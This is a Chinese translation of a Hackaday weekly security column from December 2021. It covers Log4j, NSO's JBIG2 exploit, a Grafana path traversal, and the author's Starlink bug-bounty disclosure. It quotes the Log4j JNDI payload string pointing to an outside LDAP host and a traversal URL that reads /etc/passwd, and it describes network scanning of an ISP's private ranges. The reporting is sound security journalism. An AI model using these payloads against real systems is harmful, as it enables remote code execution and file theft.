# 本周安全:Log4j，PDF CPU，我黑了 Starlink

> 原文:[https://hack aday . com/2021/12/17/this-week-in-security-log4j-pdf-CPU-and-I-hack-starlink/](https://hackaday.com/2021/12/17/this-week-in-security-log4j-pdf-cpu-and-i-hack-starlink/)

本周的大新闻是 Log4j，仅仅晚了几个小时才被列入上周的专栏。人们已经在问这是不是有史以来最严重的漏洞，看起来至少是在运行中。这个漏洞首先是由阿里巴巴的安全专家发现的，他们在 11 月 24 日通知了 Apache 这个漏洞。 [Cloudflare 已经拉了他们的数据](https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/)，早在 12 月 1 日就在野外发现了漏洞的证据。这些早期的例子非常稀少，而且极具针对性，足以让我怀疑这是不是最初披露的研究人员对这个问题做了进一步的研究。不管怎样，12 月 9 日，一名 Twitter 用户发布了该漏洞的细节，安全地狱爆发了。这条推文发布 9 分钟后，Cloudflare 再次发现了尝试利用漏洞，在 8 小时内，他们每分钟处理 [20，000 次利用漏洞尝试。](https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/)

这是时间线，但是漏洞是怎么回事，为什么这么糟糕？首先，易受攻击的包是`Log4j`，Java 的日志库。它允许进程在需要的地方获取日志消息，但是包含了一些额外的功能。其中一个特性是支持 [JNDI，这是 Java](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) 中一个已知的安全问题。JNDI 请求可能导致反序列化攻击，在这种攻击中，传入的数据流被恶意篡改，当它被扩展回一个对象时会出现错误行为。它并不打算让这些 JNDI 查找在互联网上执行，但没有明确检查这种行为，所以我们在这里。

结论是，如果您可以通过包含`${jndi:ldap://example.com/a}`的`log4j`触发日志写入，您就可以在该机器上运行任意代码。研究人员和犯罪分子已经想出了创造性的方法来管理它，比如在浏览器代理中包含字符串，或者名字。没错，就是[小巴比桌](https://xkcd.com/327/)的回归。`Log4j` 2.16.0。2.15.0 包含了部分修复，但没有完全消除问题。最新的 Java 也改变了默认设置，提供了部分缓解。但是我们可能还没有看到这个的结束。

## NSO 和 CPU 在 PDF 中仿真

如果是除了[谷歌的零项目之外的任何人讲述这个故事](https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html)，我会把它吹成一个糟糕的好莱坞阴谋装置。这个漏洞存在于 iOS iMessage 应用中，以及它如何处理实际包含 PDF 数据的`.gif`文件。委婉地说，pdf 是灵活的。一种可能的编码格式是`JBIG2`，一种 2000 年的黑白压缩编解码器。编解码器的一部分是能够使用布尔运算符 AND、OR、XOR 和 XNOR 来表示压缩块之间的微小差异。解压缩代码中的整数溢出允许更多的内存被视为解压缩的有效输出，这意味着解压缩代码可以在额外的内存上运行这些布尔运算符。

当你有足够的内存和这四个运算符时，你会得到什么呢？当然是图灵完整的 CPU。是的，NSO 小组的研究人员真的在 PDF 解码例程中构建了一个虚拟 CPU，并使用该平台来引导他们的沙盒逃脱。太疯狂了，难以置信，太聪明了。[编辑注:太糟糕了，NSO 集团本质上是邪恶的。]

## Grafana 路径遍历

Grafana 可视化平台最近刚刚修复了一个严重的问题， [CVE-2021-43798](https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p) 。该漏洞允许通过插件文件夹进行路径遍历。例如，`/public/plugins/alertlist/../../../../../../../../etc/passwd`将从 Linux 服务器返回`passwd`文件。修复此问题的更新已于 12 月 7 日发布。这个 bug 实际上有几天是 0 天，因为它在 3 号被公开讨论，但是 Grafana 开发者不知道。详情请看[他们的尸检](https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/)。

## 星联

最后，我要介绍一些原创研究。你可能熟悉我报道 Starlink 卫星互联网系统的作品。购买和保留 Starlink 的部分动机是在该平台上进行安全研究，这个目标最终取得了一些成果——[获得了 4800 美元的奖金](https://bugcrowd.com/disclosures/35b94f7c-75a6-469e-ab6c-7f9649c05595/spacex-debug-page-accessible-when-using-starlink)。故事是这样的。

我有一个附近的朋友也使用 Starlink，12 月 7 日，我们发现我们都被分配了一个可公开路由的 IPv4 地址。Starlink 的路由在用户之间是如何工作的？从我的网络发送到他的网络的流量是直接在卫星上路由，还是每个数据包都必须从卫星上反弹，通过 SpaceX 的地面站，回到小鸟，然后最终回到我这里？Traceroute 是一个很棒的工具，它回答了这个问题:

`traceroute to 98.97.92.x (98.97.92.x), 30 hops max, 46 byte packets
1 customer.dllstxx1.pop.starlinkisp.net (98.97.80.1) 25.830 ms 24.020 ms 23.082 ms
2 172.16.248.6 (172.16.248.6) 27.783 ms 23.973 ms 27.363 ms
3 172.16.248.21 (172.16.248.21) 23.728 ms 26.880 ms 28.299 ms
4 undefined.hostname.localhost (98.97.92.x) 59.220 ms 51.474 ms 51.877 ms`

我们不知道每一跳到底是什么，但跳数和每一跳的延迟相当清楚地表明，我们的流量是通过一个地面站。但是这个追踪路线有些奇怪。你发现了吗？根据 RFC1918，172.16.x.y 是一个专用网络。它出现在 traceroute 中的事实意味着我的 OpenWRT 路由器和 Starlink 设备成功地从我的桌面路由到该地址。我以前在不同的 ISP 的网络上发现过这种事情。知道这可能很有趣，我启动了`nmap`并扫描了 traceroute 中显示的私有 IP。答对了。

172.16.248.6 已被适当锁定，但 172.16.248.21 显示了打开的端口。即端口 179、9100、9101 和 50051。Nmap 认为 179 是 BGP，听起来差不多。但是其他人呢？`Telnet`。我相当确信这些都不是真正的 telnet 服务，但是在尝试识别未知服务时，这是一个很好的开始。这也不例外。![Starlink's debug output](../Images/58fd33d4376a05ff81605eaa7c0493c3.png)端口 9100 和 9101 告诉我，我提出了一个错误的请求，抛出错误 400s。啊，它们是 HTTP 服务！在 web 浏览器中打开这两个文件，我得到了一个调试输出，看起来像是来自 Python Flask 服务器。

最后一个端口 50051 很有趣。我能找到的唯一正常运行的服务是 Google 的 gRPC，一种远程过程调用协议。这正好证实了我所发现的东西。不幸的是，反射被禁用，这意味着服务拒绝枚举它支持的命令。映射任何命令都需要在该端口抛出一堆数据。

此时，我开始想知道我到底在和什么样的硬件说话。它做 BGP，它是 Starlink 网络的内部，我的流量通过它路由。这可能是卫星吗？可能不会，但是 Starlink bug bounty 很清楚接下来会发生什么。在任何情况下，研究人员都不应该在卫星或其他关键基础设施上进行现场测试。我怀疑我在和他们路由基础设施的一部分通话，可能是在达拉斯的地面站。无论哪种方式，戳得太用力，打破了东西是不赞成的，所以我写了我发现的披露。

Starlink 的工程师在接到报告后 12 小时内关闭了港口，并让我再次检查他们的分流情况。果然，虽然我还能 ping 通私有 IP，但没有端口是开放的。这就是我必须感谢 SpaceX 的 Starlink bug bounty 负责人的地方。他们本可以称之为简单的信息泄露，付几百块钱，收工。相反，他们花时间调查并确认我确实发现了一个开放的 gRPC 端口，然后抛出了一个惊人的消息，即这是一个未经验证的端点。该发现获得了 3800 美元的初始奖励，外加 1000 美元的奖金，用于一份全面的报告和不使他们的实时系统崩溃。正如我的当地朋友半开玩笑地说的，经营`nmap`要花很多钱。

是的，这里面有一点运气，再加上之前对网络怪癖的大量经验。主要的收获应该是，安全研究不一定总是超级复杂的漏洞和利用开发。你不必在 PDF 中构建图灵完整系统。有时候只是 IP 和端口扫描，加上坚持和一点运气。事实上，如果您的 ISP 有一个 bug bounty 程序，您可以尝试将 Linux 机器直接插入调制解调器，并扫描私有 IP 范围。睁大你的眼睛。你也会发现一些有趣的东西。